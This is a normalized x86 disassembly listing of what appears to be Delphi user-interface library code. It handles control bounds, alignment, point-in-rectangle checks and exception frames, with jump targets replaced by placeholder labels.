pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_44f7b4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44adb4
pop ecx
jmp r-xdata
sub_44aea0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44af8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44af95
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_448fe4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448fb4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448fb4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404570
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_4041b8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_448ed4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44af9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403564
sub_44afc8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44afe8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b008
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b028
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b048
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b068
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b088
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4215d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4485e0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403564
sub_44b0c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b15c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418f98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_455918
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_455a50
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4557b0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_455b70
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b163
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_44b16c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44b1a8
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44b16c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44b258
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4034f4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44b28c
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44b2ac
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403564
test al al
je r-xdata
mov eax edi
call sub_44b2ec
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44b318
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44b344
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406e48
mov eax esp
call sub_4172b4
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448af8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403564
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403564
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_448b24
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4172b4
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_41723c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_448acc
sub_44b46c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44b4ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cd0
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44b4e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44b5d8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44808c
push ebx
push sub_44cf70
call sub_422214
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4249a4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a0c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_4041b8
lea eax [ ebx + 0x188 ]
call sub_404164
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b5df
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_44b5df
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_44b604
push ebx
push esi
push edi
call sub_40371c
mov ebx edx
mov edi eax
mov eax edi
call sub_421424
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405b04
mov eax [ edi + 0x178 ]
call sub_403368
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_446c38
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44c2a4
mov eax edi
call sub_44c4e4
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403368
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44c4a8
mov esi eax
mov edx esi
mov eax edi
call sub_44c310
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44c4e4
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_448164
test bl bl
jle r-xdata
call sub_4222ac
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
sub_44b6d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44b798
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418a98
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44f974
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188a0
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4189ec
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4188a0
test eax eax
je r-xdata
sub_44b7a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor eax eax
push ebp
push sub_44b7e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4483c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7ef
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
sub_44b7ef
mov eax [ ebp - 0x4 ]
call sub_44b6d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cea8
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44a180
sub_44b824
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44b83f ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44b8b0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fab8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_41723c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44bc31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc38
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44bb46 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44baa9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44bc38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44bc67 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44bcf0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44c4e4
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418744
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4188a0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44b8b0
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44c4a8
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
